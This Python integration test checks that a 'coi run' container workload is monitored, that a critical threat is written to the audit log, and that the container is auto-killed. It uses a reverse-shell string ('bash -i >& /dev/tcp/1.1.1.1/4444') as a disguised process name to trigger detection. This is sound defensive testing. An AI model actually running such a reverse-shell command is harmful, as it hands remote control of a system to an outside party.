"""A `coi run` workload is monitored like a `coi shell` session.

`coi run` starts the same security monitors as a session. A CRITICAL threat
(a reverse shell) started by the run command itself must be written to the
audit log and auto-kill the container, so the run fails instead of finishing
the command (test_critical_threat_kills_container covers `coi shell`).
"""

import subprocess
import time

from support.monitoring import (
    cleanup_container,
    container_absent,
    get_container_name_from_workspace,
    get_container_state,
    get_threat_events,
)


def test_run_command_is_monitored(test_workspace, enable_monitoring, coi_binary):
    slot = 87
    container_name = (
        get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + f"-{slot}"
    )
    try:
        start = time.monotonic()
        result = subprocess.run(
            [
                coi_binary,
                "run",
                "--workspace",
                test_workspace,
                "--slot",
                str(slot),
                "--",
                "bash",
                "-c",
                "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 120",
            ],
            capture_output=True,
            text=True,
            timeout=300,
        )
        elapsed = time.monotonic() - start
        output = result.stdout + result.stderr

        # The daemon writes the kill event and syncs it before the kill, but
        # retry briefly in case of an OS-level flush delay.
        events = []
        for _ in range(10):
            events = get_threat_events(container_name)
            if any(e.get("action") == "killed" for e in events):
                break
            time.sleep(1)

        critical = [e for e in events if e.get("level") == "critical"]
        assert critical, f"no CRITICAL event in the audit log. Events: {events}\n{output}"
        assert any(e.get("action") == "killed" for e in critical), (
            f"expected action='killed' on the CRITICAL event. Events: {events}"
        )

        assert result.returncode != 0, f"a killed run should fail, got exit 0:\n{output}"
        assert "Command completed successfully" not in output, output
        assert elapsed < 120, f"the run lasted {elapsed:.0f}s: the command was not killed"
        assert container_absent(container_name), (
            f"container should be deleted, but it is {get_container_state(container_name)!r}"
        )
    finally:
        cleanup_container(container_name, coi_binary)
